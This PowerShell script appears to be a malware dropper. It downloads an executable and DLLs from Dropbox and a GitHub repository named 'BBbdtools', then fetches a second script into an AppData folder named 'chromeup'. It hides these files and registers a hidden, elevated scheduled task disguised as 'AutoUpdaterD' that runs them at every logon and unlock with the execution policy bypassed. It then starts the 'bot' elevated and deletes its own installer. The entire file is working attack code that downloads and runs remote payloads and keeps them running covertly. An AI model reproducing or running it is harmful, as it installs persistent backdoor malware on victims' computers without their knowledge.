#sets location temp
cd $env:temp

#make new folder
mkdir sVBXKuz

#cd into folder
cd sVBXKuz

#download executable and startup file
Invoke-WebRequest -Uri "dl.dropboxusercontent.com/scl/fi/p5ifhyuv4p1ui2ecolmoz/wsappa-1.6.exe?rlkey=duuxz6c3b7168p2r6iu3ozjaw&dl=0" -OutFile wsappa.exe
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/tools/libsodium.dll" -OutFile libsodium.dll
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/tools/libopus.dll" -OutFile libopus.dll


#sets location appdata
cd $env:appdata 

#make new folder
mkdir chromeup

#cd into folder
cd chromeup

#cd into folder
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/backup.ps1" -OutFile backup.ps1

#hide files
$file = "$env:temp\sVBXKuz\wsappa.exe"
$file2 = "$env:appdata\chromeup\backup.ps1"

$attr = [System.IO.FileAttributes]::Hidden

# Hide first file
Set-ItemProperty -Path $file -Name Attributes -Value ((Get-Item $file).Attributes -bor $attr)

# Hide second file
Set-ItemProperty -Path $file2 -Name Attributes -Value ((Get-Item $file2).Attributes -bor $attr)

$taskXml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2023-08-09T11:59:58.6674267</Date>
    <Author>$env:computername\$env:username</Author>
    <URI>\AutoUpdaterD</URI>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <SessionStateChangeTrigger>
      <Enabled>true</Enabled>
      <StateChange>SessionUnlock</StateChange>
    </SessionStateChangeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-21-3857279752-1707848018-4111394774-1002</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>StopExisting</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure>
      <Interval>PT5M</Interval>
      <Count>3</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Users\$env:username\AppData\Local\Temp\sVBXKuz\wsappa.exe</Command>
    </Exec>
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>/c Start-Process powershell.exe -ArgumentList '-ExecutionPolicy','Bypass','-File', $env:appdata\chromeup\backup.ps1 -Verb runAs -WindowStyle Hidden</Arguments>
    </Exec>
  </Actions>
</Task>
"@

Register-ScheduledTask -Xml $taskXml -TaskName 'AutoUpdaterD' -Force


#start bot
cd $env:temp/sVBXKuz/ ; Start-Process wsappa.exe -Verb RunAs

#clean up
powershell.exe /c Remove-Item $env:temp/dinstall.ps1

#exit
exit
